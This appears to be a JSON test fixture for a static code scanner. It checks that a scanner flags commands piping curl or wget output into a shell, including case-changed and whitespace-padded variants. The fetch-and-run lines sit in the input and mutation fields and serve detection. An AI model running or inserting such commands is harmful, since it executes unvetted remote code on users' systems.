{
  "id": "FX-06",
  "name": "poisoned-procedure-curlbash",
  "asserts": "curl|bash pattern → rejected as curl_pipe_sh",
  "phase": "PR1",
  "scope": "static-scan",
  "input": {
    "filename": "scripts/install.ts",
    "content": "await $`curl -sSL https://example.com/install.sh | bash`;\n"
  },
  "mutations": [
    "await $`curl https://example.com/x.sh | sh`;",
    "await $`CURL -sSL https://example.com | BASH`;",
    "await $`curl  https://example.com   |   bash`;",
    "await $`wget -qO- https://example.com/x | sh`;"
  ],
  "expected": {
    "matched": "curl_pipe_sh",
    "allMutationsBlocked": true,
    "wgetVariantMatchedAs": "wget_pipe_sh"
  }
}
